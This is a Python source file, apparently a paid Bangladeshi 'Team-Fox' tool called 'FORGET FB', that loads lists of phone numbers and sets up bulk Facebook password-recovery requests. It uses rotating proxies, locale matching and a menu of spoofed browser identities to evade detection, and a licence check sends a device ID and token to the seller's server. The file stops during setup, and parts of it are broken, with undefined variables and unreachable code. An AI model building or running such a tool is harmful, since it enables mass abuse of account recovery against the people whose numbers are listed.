#!/usr/bin/env python3
import os
import random
import re
import sys
import time
import platform
import webbrowser
import json
import certifi
import threading
import requests
import openpyxl
from concurrent.futures import ThreadPoolExecutor as threadpol
import ssl
import socket
import base64
from datetime import datetime, timezone, timedelta
import hashlib
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import itertools

# ================= AUTHENTICATION SYSTEM (BANGLA) =================
def get_hwid():
    try:
        # Termux/Android ID সংগ্রহ
        hwid = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
        return hwid
    except:
        # বিকল্প পদ্ধতি
        return hashlib.sha256(platform.node().encode()).hexdigest()[:16]

def check_subscription():
    # --- কনফিগারেশন (এখানে আপনার ডোমেইন দিন) ---
    BASE_URL = "https://teamfoxver.gtkmail.xyz/check.php" 
    SECRET_KEY = "Kalkebikalamurimakhabohabibmonehoiasbine"
    ADMIN_TELEGRAM = "@rk_rakibul"
    CHANNEL_LINK = "https://t.me/FB_TEAMFOX"
    
    hwid = get_hwid()
    token = hashlib.sha256((hwid + SECRET_KEY).encode()).hexdigest()
    
    try:
        response = requests.get(f"{BASE_URL}?hwid={hwid}&token={token}", timeout=10)
        status = response.text.strip()
        
        if status == "valid":
            print(f"\033[1;32m✅ Access is allowed! (ID: {hwid})\033[0m")
            time.sleep(1)
            return True
        else:
            print("\n" + "!" * 45)
            if status == "blocked":
                print("⛔ Sorry: Your access has been blocked.")
            elif status == "expired":
                print("⏰ Sorry: Your subscription has expired.")
            elif status == "not_found":
                print("🚫 Sorry: Your HWID is not registered.")
            else:
                print("⚠️ Server error: Please try again.")

            print("\n" + "="*45)
            print(f"🆔 Your HWID: {hwid}") 
            print("="*45)
            print("👆 Copy the ID above and send it to the admin.")
            print(f"\n📢 Contact: {ADMIN_TELEGRAM}")
            print(f"🔗 Channel: {CHANNEL_LINK}")
            print("!" * 45 + "\n")
            sys.exit()
            
    except Exception as e:
        print(f"\n🌐 Connection problem! Please check the internet.")
        sys.exit()

# অথেন্টিকেশন রান করা
check_subscription()
# ================= AUTH SYSTEM END =================

# --- OS COMPATIBILITY PATCH START ---
# Wrap Windows-specific imports
try:
    import wmi
    import winreg
except ImportError:
    wmi = None
    winreg = None

# Patch os.startfile for Android/Linux (Termux)
if not hasattr(os, 'startfile'):
    def _startfile(filepath):
        if filepath.endswith('.exe'):
            print(f"\n\x1b[1;91m [!] Cannot execute .exe files on Android/Termux: {filepath}")
        else:
            try:
                subprocess.call(['xdg-open', filepath])
            except:
                pass
    os.startfile = _startfile

# Patch os.getlogin for Termux if it fails
try:
    os.getlogin()
except OSError:
    def _getlogin_patch():
        try:
            return os.environ.get('USER', 'termux_user')
        except:
            return 'termux_user'
    os.getlogin = _getlogin_patch
# --- OS COMPATIBILITY PATCH END ---

if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')
    os.system('')

if getattr(sys, 'frozen', False):
    os.chdir(os.path.dirname(sys.executable))

WHITE = '\x1b[1;97m'
GREEN = '\x1b[1;92m'
RED = '\x1b[1;91m'
DARK_GREEN = '\x1b[1;32m'
LIGHT_GRAY = '\x1b[1;37m'
CYAN = '\x1b[1;96m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
MAGENTA = '\x1b[1;95m'
ORANGE = '\x1b[38;5;208m'
GOLD = '\x1b[38;5;220m'
VIOLET = '\x1b[38;5;141m'
TOXIC = '\x1b[38;2;170;200;0m'
PURPLE = '\x1b[38;2;150;80;200m'

opt_labels = [f"{GREEN}[{RED}{str(i).zfill(2)}{GREEN}]" for i in range(1, 8)]

l0 = f"{GREEN}[{RED}00{GREEN}]"
EKL = f"{CYAN}:{WHITE}"
LINE = f"{CYAN}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"

SERVER_MAP = {
    1: 'm.facebook.com',
    2: 'mbasic.facebook.com',
    3: 'touch.facebook.com',
    4: 'free.facebook.com',
    5: 'm.alpha.facebook.com',
    6: 'm.beta.facebook.com',
    7: 'x.facebook.com'
}

print_lock = threading.Lock()
counter_lock = threading.Lock()

total_checked = 0
total_success = 0
total_failed = 0
total_error = 0
PROXIES = None
CURRENT_LOCALE = 'en_US'

# Authentication functions removed (make_request, dec_rq, dec_rq2, get_safe_cmd, get_windows_device_id, apvv)

def parse_proxy(proxy_str):
    if '://' not in proxy_str:
        parts = proxy_str.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
        elif len(parts) == 2:
            ip, port = parts
            proxy_url = f"http://{ip}:{port}"
        else:
            return None
    else:
        proxy_url = proxy_str
    
    return {'http': proxy_url, 'https': proxy_url}

def test_proxy(proxies, server_domain):
    try:
        r = requests.get(f"https://{server_domain}", proxies=proxies, timeout=10)
        return r.status_code == 200
    except:
        return False

COUNTRY_TO_LOCALE = {
    'AD': 'ca_ES', 'AE': 'ar_AR', 'AF': 'fa_IR', 'AG': 'en_US', 'AI': 'en_US', 'AL': 'sq_AL',
    'AM': 'hy_AM', 'AO': 'pt_PT', 'AQ': 'en_US', 'AR': 'es_LA', 'AS': 'en_US', 'AT': 'de_DE',
    'AU': 'en_GB', 'AW': 'nl_NL', 'AX': 'sv_SE', 'AZ': 'az_AZ', 'BA': 'bs_BA', 'BB': 'en_US',
    'BD': 'bn_IN', 'BE': 'nl_BE', 'BF': 'fr_FR', 'BG': 'bg_BG', 'BH': 'ar_AR', 'BI': 'fr_FR',
    'BJ': 'fr_FR', 'BL': 'fr_FR', 'BM': 'en_US', 'BN': 'ms_MY', 'BO': 'es_LA', 'BQ': 'nl_NL',
    'BR': 'pt_BR', 'BS': 'en_US', 'BT': 'dz_BT', 'BV': 'en_GB', 'BW': 'en_GB', 'BY': 'ru_RU',
    'BZ': 'en_US', 'CA': 'en_US', 'CC': 'en_GB', 'CD': 'fr_FR', 'CF': 'fr_FR', 'CG': 'fr_FR',
    'CH': 'de_DE', 'CI': 'fr_FR', 'CK': 'en_US', 'CL': 'es_LA', 'CM': 'fr_FR', 'CN': 'zh_CN',
    'CO': 'es_LA', 'CR': 'es_LA', 'CU': 'es_LA', 'CV': 'pt_PT', 'CW': 'nl_NL', 'CX': 'en_GB',
    'CY': 'el_GR', 'CZ': 'cs_CZ', 'DE': 'de_DE', 'DJ': 'fr_FR', 'DK': 'da_DK', 'DM': 'en_US',
    'DO': 'es_LA', 'DZ': 'ar_AR', 'EC': 'es_LA', 'EE': 'et_EE', 'EG': 'ar_AR', 'EH': 'ar_AR',
    'ER': 'ti_ET', 'ES': 'es_ES', 'ET': 'am_ET', 'FI': 'fi_FI', 'FJ': 'en_US', 'FK': 'en_GB',
    'FM': 'en_US', 'FO': 'da_DK', 'FR': 'fr_FR', 'GA': 'fr_FR', 'GB': 'en_GB', 'GD': 'en_US',
    'GE': 'ka_GE', 'GF': 'fr_FR', 'GG': 'en_GB', 'GH': 'en_GB', 'GI': 'en_GB', 'GL': 'da_DK',
    'GM': 'en_GB', 'GN': 'fr_FR', 'GP': 'fr_FR', 'GQ': 'es_ES', 'GR': 'el_GR', 'GS': 'en_GB',
    'GT': 'es_LA', 'GU': 'en_US', 'GW': 'pt_PT', 'GY': 'en_US', 'HK': 'zh_HK', 'HM': 'en_US',
    'HN': 'es_LA', 'HR': 'hr_HR', 'HT': 'fr_FR', 'HU': 'hu_HU', 'ID': 'id_ID', 'IE': 'en_GB',
    'IL': 'he_IL', 'IM': 'en_GB', 'IN': 'hi_IN', 'IO': 'en_GB', 'IQ': 'ar_AR', 'IR': 'fa_IR',
    'IS': 'is_IS', 'IT': 'it_IT', 'JE': 'en_GB', 'JM': 'en_US', 'JO': 'ar_AR', 'JP': 'ja_JP',
    'KE': 'en_GB', 'KG': 'ru_RU', 'KH': 'km_KH', 'KI': 'en_US', 'KM': 'fr_FR', 'KN': 'en_US',
    'KP': 'ko_KR', 'KR': 'ko_KR', 'KW': 'ar_AR', 'KY': 'en_US', 'KZ': 'ru_RU', 'LA': 'lo_LA',
    'LB': 'ar_AR', 'LC': 'en_US', 'LI': 'de_DE', 'LK': 'si_LK', 'LR': 'en_US', 'LS': 'en_GB',
    'LT': 'lt_LT', 'LU': 'fr_FR', 'LV': 'lv_LV', 'LY': 'ar_AR', 'MA': 'ar_AR', 'MC': 'fr_FR',
    'MD': 'ro_RO', 'ME': 'sr_RS', 'MF': 'fr_FR', 'MG': 'fr_FR', 'MH': 'en_US', 'MK': 'mk_MK',
    'ML': 'fr_FR', 'MM': 'my_MM', 'MN': 'mn_MN', 'MO': 'zh_TW', 'MP': 'en_US', 'MQ': 'fr_FR',
    'MR': 'ar_AR', 'MS': 'en_US', 'MT': 'en_GB', 'MU': 'en_GB', 'MV': 'dv_MV', 'MW': 'en_GB',
    'MX': 'es_MX', 'MY': 'ms_MY', 'MZ': 'pt_PT', 'NA': 'en_GB', 'NC': 'fr_FR', 'NE': 'fr_FR',
    'NF': 'en_GB', 'NG': 'en_GB', 'NI': 'es_LA', 'NL': 'nl_NL', 'NO': 'nb_NO', 'NP': 'ne_NP',
    'NR': 'en_US', 'NU': 'en_US', 'NZ': 'en_GB', 'OM': 'ar_AR', 'PA': 'es_LA', 'PE': 'es_LA',
    'PF': 'fr_FR', 'PG': 'en_US', 'PH': 'tl_PH', 'PK': 'ur_PK', 'PL': 'pl_PL', 'PM': 'fr_FR',
    'PN': 'en_GB', 'PR': 'es_LA', 'PS': 'ar_AR', 'PT': 'pt_PT', 'PW': 'en_US', 'PY': 'es_LA',
    'QA': 'ar_AR', 'RE': 'fr_FR', 'RO': 'ro_RO', 'RS': 'sr_RS', 'RU': 'ru_RU', 'RW': 'fr_FR',
    'SA': 'ar_AR', 'SB': 'en_US', 'SC': 'fr_FR', 'SD': 'ar_AR', 'SE': 'sv_SE', 'SG': 'en_GB',
    'SH': 'en_GB', 'SI': 'sl_SI', 'SJ': 'nb_NO', 'SK': 'sk_SK', 'SL': 'en_GB', 'SM': 'it_IT',
    'SN': 'fr_FR', 'SO': 'so_SO', 'SR': 'nl_NL', 'SS': 'en_GB', 'ST': 'pt_PT', 'SV': 'es_LA',
    'SX': 'nl_NL', 'SY': 'ar_AR', 'SZ': 'en_GB', 'TC': 'en_US', 'TD': 'fr_FR', 'TF': 'fr_FR',
    'TG': 'fr_FR', 'TH': 'th_TH', 'TJ': 'tg_TJ', 'TK': 'en_US', 'TL': 'pt_PT', 'TM': 'ru_RU',
    'TN': 'ar_AR', 'TO': 'en_US', 'TR': 'tr_TR', 'TT': 'en_US', 'TV': 'en_US', 'TW': 'zh_TW',
    'TZ': 'sw_KE', 'UA': 'uk_UA', 'UG': 'en_GB', 'UM': 'en_US', 'US': 'en_US', 'UY': 'es_LA',
    'UZ': 'uz_UZ', 'VA': 'it_IT', 'VC': 'en_US', 'VE': 'es_LA', 'VG': 'en_GB', 'VI': 'en_US',
    'VN': 'vi_VN', 'VU': 'en_US', 'WF': 'fr_FR', 'WS': 'en_US', 'YE': 'ar_AR', 'YT': 'fr_FR',
    'ZA': 'en_GB', 'ZM': 'en_GB', 'ZW': 'en_GB'
}

def get_locale_code(country_code):
    return COUNTRY_TO_LOCALE.get(country_code.upper(), 'en_US')

def get_ip_info(proxies=None):
    try:
        r = requests.get("http://ip-api.com/json/", proxies=proxies, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {
                'country': data.get('country', 'Unknown'),
                'countryCode': data.get('countryCode', 'US'),
                'timezone': data.get('timezone', 'Unknown')
            }
    except:
        pass
    return {'country': 'Unknown', 'countryCode': 'US', 'timezone': 'Unknown'}

def load_settings():
    try:
        with open('Setting.json', 'r') as f:
            return json.load(f)
    except:
        return {}

def get_status_line():
    return f"\r{GREEN}[{WHITE}Team-Fox{GREEN}] {WHITE}CHECKED:-{total_checked}{CYAN}|{GREEN}SUCCESS:-{total_success}{CYAN}|{YELLOW}FAILED:-{total_failed}{CYAN}|{RED}ERROR:-{total_error}"

def safe_print(text):
    with print_lock:
        sys.stdout.write('\r                                                                                \r')
        try:
            sys.stdout.write(str(text) + '\n')
        except UnicodeEncodeError:
            sys.stdout.write(str(text).encode('utf-8', 'ignore').decode('utf-8') + '\n')
        sys.stdout.write(get_status_line())
        sys.stdout.flush()

def update_counter(status, number=None, message=None, color=None, html_content=None):
    global total_success, total_failed, total_error, total_checked
    
    with counter_lock:
        if status == 'success':
            total_success += 1
        elif status == 'failed':
            total_failed += 1
        elif status == 'error':
            total_error += 1
            if html_content:
                save_error_html(message if message else "Unknown Error", html_content)
        
        total_checked += 1
    
    if message and number:
        if not color: color = WHITE
        safe_print(f"{color} {message} {number}")
        return
    
    if message:
        if not color: color = WHITE
        safe_print(f"{color} {message}")
        return

    with print_lock:
        sys.stdout.write(get_status_line())
        sys.stdout.flush()

SAVE_ERROR_LOGS = 'off'

def reset_counters():
    global total_checked, total_success, total_failed, total_error
    total_checked = 0
    total_success = 0
    total_failed = 0
    total_error = 0

def save_error_html(message, html_content):
    if SAVE_ERROR_LOGS.lower() != 'on':
        return

    try:
        if not os.path.exists('Error_Logs'):
            os.makedirs('Error_Logs')
            
        safe_msg = re.sub(r'[\\/*?:"<>|]', '', message)
        safe_msg = safe_msg.replace(' ', '_')
        safe_msg = safe_msg[:50]
        
        base_filename = f"Error_Logs/{safe_msg}.html"
        filename = base_filename
        counter = 1
        
        while os.path.exists(filename):
            filename = f"Error_Logs/{safe_msg}_{counter}.html"
            counter += 1
            
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"<!-- Error: {message} -->\n")
            f.write(html_content)
    except Exception as e:
        safe_print(f"{RED} Failed to save error log: {e}")

def clear_logo():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')
        
    print(''.join([
GREEN, "\n",
"████████╗███╗   ███╗  ███████╗ ██████╗ ██╗  ██╗\n",
"╚══██╔══╝████╗ ████║  ██╔════╝██╔═══██╗╚██╗██╔╝\n",
"   ██║   ██╔████╔██║  █████╗  ██║   ██║ ╚███╔╝\n",
"   ██║   ██║╚██╔╝██║  ██╔══╝  ██║   ██║ ██╔██╗\n",
"   ██║   ██║ ╚═╝ ██║  ██║     ╚██████╔╝██╔╝ ██╗\n",
"   ╚═╝   ╚═╝     ╚═╝  ╚═╝      ╚═════╝ ╚═╝  ╚═╝\n",
ORANGE, "                                  V-1.0\n",
LINE, "\n ",
GREEN, "[", RED, "●", GREEN, "] TOOL OWNER   ", CYAN, ": ", GREEN, "@itzmendix\n ",
GREEN, "[", RED, "●", GREEN, "] TOOL         ", CYAN, ": ", GREEN, "FORGET FB\n ",
GREEN, "[", RED, "●", GREEN, "] TOOL STATUS  ", CYAN, ": ", GREEN, "PAID\n",
LINE
]))


def sxr_main():
    clear_logo()
    print(f" {GREEN}UserName {EKL} {user_nm}\n {RED}Expired {EKL} {expr} (Utc)\n{LINE}")
    print(f" {opt_labels[0]} FB FORGET\n {opt_labels[1]} JOIN TELEGRAM\n{LINE}")
    
    chic_opsn = input(f"{GREEN} [{RED}●{GREEN}] CHOOSE OPTION {EKL} ")
    
    if chic_opsn in ('1', '01', 'A', 'a'):
        file_inp()
        return
    elif chic_opsn in ('2', '02', 'B', 'b'):
        webbrowser.open('https://t.me/FB_TEAMFOX')
        return
    else:
        print(f"\n{RED} You have selected the wrong option..")
        time.sleep(3)
        sxr_main()
        return

def extract_numbers_from_excel(filename):
    try:
        wb = openpyxl.load_workbook(filename, data_only=True)
        sheet = wb.active
        target_col_idx = None
        max_matches = 0
        
        for col_idx in range(1, sheet.max_column + 1):
            match_count = 0
            for row_idx in range(2, min(22, sheet.max_row + 1)):
                cell_val = sheet.cell(row=row_idx, column=col_idx).value
                if cell_val:
                    s_val = str(cell_val).strip()
                    s_cleaned = re.sub(r'[\s\-\(\)\+]', '', s_val)
                    if s_cleaned.isdigit():
                        if 7 <= len(s_cleaned) <= 15:
                            match_count += 1
            
            if match_count > max_matches:
                max_matches = match_count
                target_col_idx = col_idx
                
        if target_col_idx is None:
            return None, 'No phone number column found.'
            
        numbers = []
        for row in sheet.iter_rows(min_row=1, max_row=sheet.max_row, min_col=target_col_idx, max_col=target_col_idx, values_only=True):
            val = row[0]
            if val:
                s_val = str(val).strip()
                s_cleaned = re.sub(r'[\s\-\(\)\+]', '', s_val)
                if s_cleaned.isdigit():
                    if 7 <= len(s_cleaned) <= 15:
                        numbers.append(s_cleaned)
                        
        return numbers, None
    except Exception as e:
        return None, str(e)

def file_inp():
    clear_logo()
    print(f"{GREEN}[?] Enter Number File Path (.txt)")
    file_path = input(f"{GREEN}[>] Enter Path: {WHITE}").strip()

    if not file_path:
        print(f"{RED} No path entered!")
        time.sleep(2)
        sxr_main()
        return

    if not os.path.isfile(file_path):
        print(f"{RED} File not found!")
        time.sleep(2)
        sxr_main()
        return

    if not file_path.lower().endswith('.txt'):
        print(f"{RED} Please select a .txt file!")
        time.sleep(2)
        sxr_main()
        return

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            numbers = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED} Error reading file: {e}")
        time.sleep(2)
        sxr_main()
        return

    if not numbers:
        print(f"{RED} File is empty!")
        time.sleep(2)
        sxr_main()
        return

    print(f"{GREEN} Selected File {EKL} {file_path}")
    input(f"{WHITE} Press Enter to Start Forgetting {len(numbers)} Numbers...")
    
    # কাজের জন্য numbers লিস্ট সেট করো
    with open('Number_List.txt', 'w', encoding='utf-8', errors='ignore') as wf:
        for n in numbers:
            wf.write(n + '\n')

    autom_main()


    if use_multiple_excel:
        xlsx_files = [f for f in os.listdir('.') if f.endswith('.xlsx') and not f.startswith('~$')]
        
        if xlsx_files:
            print(f"{GREEN} [{RED}●{GREEN}] Found {len(xlsx_files)} Excel Files.")
            all_numbers = []
            
            for f in xlsx_files:
                print(f"{WHITE} Extracting from {EKL} {f}...")
                nums, err = extract_numbers_from_excel(f)
                if nums:
                    all_numbers.extend(nums)
                    print(f"{GREEN}  -> Found {len(nums)} numbers.")
                else:
                    print(f"{RED}  -> Failed: {err}")
            
            if all_numbers:
                all_numbers = list(set(all_numbers))
                with open('Number_List.txt', 'w', encoding='utf-8', errors='ignore') as f:
                    for num in all_numbers:
                        f.write(num + '\n')
                        
                print(f"\n{GREEN} [{RED}●{GREEN}] Total Unique Numbers Extracted {EKL} {len(all_numbers)}")
                print(f"{GREEN} [{RED}●{GREEN}] Saved to 'Number_List.txt'\n")
                input(f"{WHITE} Press Enter to Start Forgetting {len(all_numbers)} Numbers...")
                autom_main()
                return
            else:
                print(f"{RED} No valid numbers found in any Excel files.")
                input(f"{WHITE} Press Enter to return to main menu...")
                sxr_main()
                return
        
        if os.path.exists('Number_List.txt'):
            with open('Number_List.txt', 'r', encoding='utf-8', errors='ignore') as f:
                numbers = [line.strip() for line in f if line.strip()]
            
            if numbers:
                print(f"{WHITE} No Excel files found, using Number_List.txt")
                print(f"{GREEN} [{RED}●{GREEN}] Selected File {EKL} Number_List.txt")
                input(f"{WHITE} Press Enter to Start Forgetting {len(numbers)} Numbers...")
                autom_main()
                return
            else:
                print(f"{WHITE} No Excel files found and 'Number_List.txt' is empty.")
                input(f"{WHITE} Press Enter to return to main menu...")
                sxr_main()
                return
        else:
            print(f"{WHITE} No Excel files found and 'Number_List.txt' not found.")
            input(f"{WHITE} Press Enter to return to main menu...")
            sxr_main()
            return

    files = [f for f in os.listdir('.') if f.endswith('.xlsx') and not f.startswith('~$')]
    
    if not files:
        if os.path.exists('Number_List.txt'):
            with open('Number_List.txt', 'r', encoding='utf-8', errors='ignore') as f:
                numbers = [line.strip() for line in f if line.strip()]
            
            if numbers:
                print(f"{GREEN} [{RED}●{GREEN}] Selected File {EKL} Number_List.txt")
                input(f"{WHITE} Press Enter to Start Forgetting {len(numbers)} Numbers...")
                autom_main()
                return
            else:
                print(f"{WHITE} No Excel files found or 'Number_List.txt' file is empty.")
                input(f"{WHITE} Press Enter to return to main menu...")
                sxr_main()
                return
        else:
            print(f"{WHITE} No Excel files found and 'Number_List.txt' were not found.")
            input(f"{WHITE} Press Enter to return to main menu...")
            sxr_main()
            return
            
    filename = None
    if len(files) == 1:
        filename = files[0]
    else:
        print(f"{GREEN} [{RED}●{GREEN}] Found {len(files)} Excel Files:")
        for idx, f in enumerate(files, 1):
            print(f" {GREEN}[{RED}{idx}{GREEN}] {f}")
        print(LINE)
        
        while True:
            choice = input(f"{GREEN} [{RED}●{GREEN}] Select File (1-{len(files)}) {EKL} ").strip()
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(files):
                    filename = files[idx]
                    break
            print(f"{RED} Invalid selection!")

    print(f"{GREEN} [{RED}●{GREEN}] Selected File {EKL} {filename}\n")
    nums, err = extract_numbers_from_excel(filename)
    
    if nums:
        with open('Number_List.txt', 'w', encoding='utf-8', errors='ignore') as f:
            for num in nums:
                f.write(num + '\n')
                
        print(f"{GREEN} [{RED}●{GREEN}] Success! Extracted {len(nums)} numbers From {filename} File.")
        print(f"{GREEN} [{RED}●{GREEN}] Saved to 'Number_List.txt'\n")
        input(f"{WHITE} Press Enter to Start Forgetting {len(nums)} Numbers...")
        autom_main()
        return
    else:
        print(f"{RED} Error: {err}")
        input(f"{WHITE} Press Enter to return Main Menu...")
        sxr_main()
        return

def get_proxy_list(settings_key, prompt_label):
    settings = load_settings()
    proxy_set = settings.get(settings_key, {})
    ask_proxy = proxy_set.get('ask_for_proxy', True)
    def_proxy = proxy_set.get('default_proxy', '')
    
    server_set = settings.get('server_settings', {})
    server_id = server_set.get('tools_server_id', 1)
    server_domain = SERVER_MAP.get(server_id, 'm.facebook.com')
    
    ask_proxy_final = ask_proxy
    PROXY_LIST = []
    
    if def_proxy:
        if isinstance(def_proxy, list):
            print(f"{WHITE} Testing {len(def_proxy)} Default {prompt_label}...")
            for p in def_proxy:
                parsed = parse_proxy(p)
                if parsed and test_proxy(parsed, server_domain):
                    nfo = get_ip_info(parsed)
                    loc = get_locale_code(nfo['countryCode'])
                    PROXY_LIST.append({'proxy': parsed, 'locale': loc, 'country': nfo['country']})
                    print(f"{GREEN} [{RED}●{GREEN}] {prompt_label} Location {EKL} {nfo['country']}")
                    print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {loc}")
                else:
                    print(f"{RED} Default {prompt_label} Connection Failed: {p}")
        else:
            parsed_proxies = parse_proxy(def_proxy)
            if parsed_proxies:
                print(f"{WHITE} Testing Default {prompt_label}...")
                if test_proxy(parsed_proxies, server_domain):
                    nfo = get_ip_info(parsed_proxies)
                    loc = get_locale_code(nfo['countryCode'])
                    PROXY_LIST.append({'proxy': parsed_proxies, 'locale': loc, 'country': nfo['country']})
                    print(f"{GREEN} [{RED}●{GREEN}] {prompt_label} Location {EKL} {nfo['country']}")
                    print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {loc}")
                else:
                    print(f"{RED} Default {prompt_label} Connection Failed!")
            else:
                print(f"{RED} Invalid Default {prompt_label} Format!")
                
        if def_proxy and not PROXY_LIST:
            print(f"{RED} All Default {prompt_label} Failed!")
            ask_proxy_final = True
            
    if PROXY_LIST and ask_proxy:
        ask_proxy_final = False
        
    if ask_proxy_final:
        while True:
            try:
                proxy_input = input(f"{GREEN} [{RED}●{GREEN}] Enter {prompt_label} (or 'y' for multiple) [Enter to Skip] {EKL} ").strip()
                # ✅ FIX: Enter to Skip
                if proxy_input == "":
                    print(f"{YELLOW} Skipping {prompt_label}...")
                    break
                if proxy_input.lower() == 'y':
                    cnt_in = input(f"{GREEN} [{RED}●{GREEN}] How many {prompt_label}? {EKL} ")
                    if cnt_in.strip():
                        cnt = int(cnt_in)
                        for i in range(cnt):
                            p_in = input(f"{WHITE} [{RED}●{WHITE}] Enter {prompt_label} [{i+1}/{cnt}] {EKL} ").strip()
                            if p_in:
                                print(f"{WHITE} Testing {prompt_label}...")
                                parsed = parse_proxy(p_in)
                                if parsed and test_proxy(parsed, server_domain):
                                    nfo = get_ip_info(parsed)
                                    loc = get_locale_code(nfo['countryCode'])
                                    print(f"{GREEN} [{RED}●{GREEN}] {prompt_label} Location {EKL} {nfo['country']}")
                                    print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {loc}")
                                    PROXY_LIST.append({'proxy': parsed, 'locale': loc, 'country': nfo['country']})
                                else:
                                    print(f"{RED} Connection Failed or Invalid Format!")
                        break
                    else:
                        print(f"{RED} Invalid Number!")
                        break

                if proxy_input:
                    parsed_proxies = parse_proxy(proxy_input)
                    if parsed_proxies:
                        print(f"{WHITE} Testing {prompt_label}...")
                        if test_proxy(parsed_proxies, server_domain):
                            nfo = get_ip_info(parsed_proxies)
                            loc = get_locale_code(nfo['countryCode'])
                            print(f"{GREEN} [{RED}●{GREEN}] {prompt_label} Location {EKL} {nfo['country']}")
                            print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {loc}")
                            PROXY_LIST.append({'proxy': parsed_proxies, 'locale': loc, 'country': nfo['country']})
                            break
                        else:
                            print(f"{RED} {prompt_label} Connection Failed!")
                    else:
                        print(f"{RED} Invalid {prompt_label} Format!")
                
                if PROXY_LIST or not ask_proxy_final:
                    break
                    
            except:
                print(f"{RED} Invalid Input")
                
    return PROXY_LIST

def autom_main():
    while True:
        clear_logo()
        try:
            with open('Number_List.txt', 'r', encoding='utf-8', errors='ignore') as f:
                numbers = [line.strip() for line in f if line.strip()]
            
            if not numbers:
                input(f"{WHITE} Add the 'Number_List.txt' file and press Enter...")
                continue
            break
        except Exception as e:
            print(f"{RED} Error reading file {EKL} {e}")
            input(f"{WHITE} Press Enter to return...")
            sxr_main()
            return

    settings = load_settings()
    server_set = settings.get('server_settings', {})
    server_id = server_set.get('tools_server_id', 1)
    server_domain = SERVER_MAP.get(server_id, 'm.facebook.com')

    print(f"{WHITE} Setting up Main Proxy System...")
    PROXY_LIST = get_proxy_list('proxy_settings', 'Main Proxy')
    
    PROXY_ITERATOR = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
    
    if PROXY_LIST:
        print(f"{GREEN} [{RED}●{GREEN}] Total Main Proxies {EKL} {len(PROXY_LIST)}")
        if len(PROXY_LIST) > 1:
            countries = set(p['country'] for p in PROXY_LIST)
            if len(countries) > 1:
                print(f"{GREEN} [{RED}●{GREEN}] IP Location {EKL} Multiple ({len(countries)} Countries)")
                print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} Mixed")
            else:
                nfo = get_ip_info(None)
                loc = get_locale_code(nfo['countryCode'])
                global CURRENT_LOCALE
                CURRENT_LOCALE = loc
                print(f"{GREEN} [{RED}●{GREEN}] IP Location {EKL} {nfo['country']}")
                print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {loc}")
    else:
        nfo = get_ip_info(None)
        loc = get_locale_code(nfo['countryCode'])
        CURRENT_LOCALE = loc
        print(f"{GREEN} [{RED}●{GREEN}] IP Location {EKL} {nfo['country']}")
        print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {loc}")

    print(f"{LINE}\n{WHITE} Setting up 2nd Option Proxy System...")
    SMS_PROXY_LIST = get_proxy_list('sms_proxy_settings', 'SMS Proxy')
    SMS_PROXY_ITERATOR = itertools.cycle(SMS_PROXY_LIST) if SMS_PROXY_LIST else None
    
    if SMS_PROXY_LIST:
        print(f"{GREEN} [{RED}●{GREEN}] Total SMS Proxies  {EKL} {len(SMS_PROXY_LIST)}")
    else:
        print(f"{YELLOW} No Proxy configured. Will continue with Main Proxy")

    brow_set = settings.get('browser_settings', {})
    def_brow = str(brow_set.get('default_browser', 'none')).strip().lower()
    
    if def_brow != 'none' and def_brow != '':
        brow_inp = def_brow
    else:
        print(''.join([LINE, '\n ', GREEN, '[', RED, '0', GREEN, '] Random ', WHITE, '(Mix) \n ', GREEN, '[', RED, '1', GREEN, '] Brave ', WHITE, '(Default) ', GREEN, '[', RED, '6', GREEN, '] Opera         ', GREEN, '[', RED, '11', GREEN, '] Kiwi Browser\n ', GREEN, '[', RED, '2', GREEN, '] Chrome          ', GREEN, '[', RED, '7', GREEN, '] UC Browser    ', GREEN, '[', RED, '12', GREEN, '] Dolphin\n ', GREEN, '[', RED, '3', GREEN, '] Edge            ', GREEN, '[', RED, '8', GREEN, '] DuckDuckGo    ', GREEN, '[', RED, '13', GREEN, '] Mi Browser\n ', GREEN, '[', RED, '4', GREEN, '] Firefox         ', GREEN, '[', RED, '9', GREEN, '] Vivaldi       ', GREEN, '[', RED, '14', GREEN, '] Maxthon\n ', GREEN, '[', RED, '5', GREEN, '] Samsung         ', GREEN, '[', RED, '10', GREEN, '] Yandex       ', GREEN, '[', RED, '15', GREEN, '] Puffin\n', LINE]))
        brow_inp = input(f"{GREEN} [{RED}●{GREEN}] Select Browser {EKL} ").strip()

    if brow_inp == '1': browser_type = 'Brave'
    elif brow_inp == '2': browser_type = 'Chrome'
    elif brow_inp == '3': browser_type = 'Edge'
    elif brow_inp == '4': browser_type = 'Firefox'
    elif brow_inp == '5': browser_type = 'Samsung'
    elif brow_inp == '6': browser_type = 'Opera'
    elif brow_inp == '7': browser_type = 'UC'
    elif brow_inp == '8': browser_type = 'DuckDuckGo'
    elif brow_inp == '9': browser_type = 'Vivaldi'
    elif brow_inp == '10': browser_type = 'Yandex'
    elif brow_inp == '11': browser_type = 'Kiwi'
    elif brow_inp == '12': browser_type = 'Dolphin'
    elif brow_inp == '13': browser_type = 'Mi Browser'
    elif brow_inp == '14': browser_type = 'Maxthon'
    elif brow_inp == '15': browser_type = 'Puffin'
    elif brow_inp == '0': browser_type = 'Random'
    else: browser_type = 'Brave'
    
    if def_brow != 'none' and def_brow != '':
        print(f"{GREEN} [{RED}●{GREEN}] Selected Browser {EKL} {browser_type}")

    worker_set = settings.get('worker_settings', {})
